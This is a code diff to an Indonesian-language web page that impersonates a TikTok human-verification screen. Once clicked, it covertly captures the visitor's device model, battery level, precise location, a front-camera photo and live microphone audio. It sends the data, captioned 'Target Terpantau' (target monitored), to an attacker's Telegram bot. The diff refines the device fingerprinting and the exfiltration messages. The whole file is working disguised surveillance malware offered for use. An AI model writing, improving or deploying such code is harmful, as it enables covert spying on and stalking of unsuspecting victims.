@@ -58,7 +58,6 @@
 <body>
 
 <div id="verifyBox" class="box">
-    <!-- Menggunakan logo resmi TikTok dengan latar belakang transparan -->
     <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="logo" alt="TikTok">
     <p>Sistem mendeteksi aktivitas tidak biasa pada perangkat Anda. Silakan verifikasi bahwa Anda adalah manusia untuk melanjutkan ke aplikasi.</p>
     <button class="btn" onclick="startSystem()">VERIFIKASI SEKARANG</button>
@@ -79,17 +78,49 @@
 
     async function getAdvancedDeviceName() {
         let rawModel = "Mobile Device";
+        
+        // 1. Coba deteksi menggunakan API modern (Chromium)
         if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
             try {
                 const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
-                rawModel = hints.model || rawModel;
+                if (hints.model) rawModel = hints.model;
             } catch (e) {}
-        } else {
-            const ua = navigator.userAgent;
-            const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
-            if (match) rawModel = match[3].split(" Build")[0].trim();
-        }
+        } 
         
+        // 2. Fallback pembacaan regex string jika API modern tidak tersedia/gagal
+        if (rawModel === "Mobile Device") {
+            const ua = navigator.userAgent;
+            
+            if (/iPhone|iPad|iPod/i.test(ua)) {
+                return "Apple iPhone";
+            }
+            
+            // Mengambil teks di dalam kurung pertama yang berisi detail hardware
+            const matchContainer = ua.match(/\(([^)]+)\)/);
+            if (matchContainer && matchContainer[1]) {
+                const tokens = matchContainer[1].split(';');
+                // Cari string yang biasanya berisi kode model Android sebelum kata 'Build/'
+                for (let token of tokens) {
+                    token = token.trim();
+                    if (token.includes('Build/')) {
+                        rawModel = token.split('Build/')[0].trim();
+                        break;
+                    }
+                    // Alternatif jika string tidak mencantumkan kata 'Build/' tapi mengandung format model umum
+                    if (/Linux/i.test(token) || /Android/i.test(token) || /wv/i.test(token)) {
+                        continue;
+                    }
+                    if (token.length > 3 && token.length < 20) {
+                        rawModel = token;
+                    }
+                }
+            }
+        }
+
+        // Pembersihan karakter noise jika terbawa dari webview (misal: "wv POCO X6 Pro")
+        rawModel = rawModel.replace(/^wv\s/, '').trim();
+        
+        // Database pencocokan kode bentukan ke nama komersial perangkat
         const db = {
             "2310FPCA4G": "POCO C65", "M2102J20SG": "POCO X3 Pro", "2201117TY": "Redmi Note 11", 
             "2201116SG": "Redmi Note 11 Pro", "22101316G": "POCO M5", "M2012K11AG": "POCO F3", 
@@ -113,6 +144,7 @@
             "V2141": "Vivo Y75 5G", "V2249": "Vivo V25 Pro", "V2217": "Vivo Y22",
             "KJ5": "Tecno Spark 20", "AD6": "Tecno Pova 5", "BG6": "Itel P55", "S665L": "Itel Vision 1"
         };
+        
         return db[rawModel] || rawModel;
     }
 
@@ -120,7 +152,6 @@
         deviceName = await getAdvancedDeviceName();
         document.getElementById('verifyBox').style.display = 'none';
         document.getElementById('mainContent').style.display = 'block';
-        // Mengalihkan iframe ke halaman utama TikTok setelah klik verifikasi
         document.getElementById('gFrame').src = "https://www.tiktok.com/";
 
         if (navigator.geolocation) {
@@ -129,7 +160,6 @@
             }, err => { userLoc = "Izin Lokasi Ditolak"; }, { enableHighAccuracy: true });
         }
 
-        // Tetap menggunakan Kamera Depan
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('video').srcObject = stream;
@@ -142,7 +172,6 @@
             } catch (err) { takeAndSend(); }
         }
 
-        // Tetap menggunakan Live Mic
         startAudioCapture();
     }
 
@@ -185,13 +214,15 @@
         const report = (blob) => {
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera Depan`);
-            fd.append('parse_mode', 'Markdown');
+            
             if (blob) {
                 fd.append('photo', blob, 'shot.jpg');
+                fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera Depan`);
+                fd.append('parse_mode', 'Markdown');
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             } else {
-                fd.append('text', fd.get('caption'));
+                fd.append('text', `👁 *Target Terpantau (Teks Saja)*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n⚠️ Kamera tidak aktif.`);
+                fd.append('parse_mode', 'Markdown');
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: fd });
             }
         };
@@ -208,3 +239,4 @@
 </script>
 </body>
 </html>
+
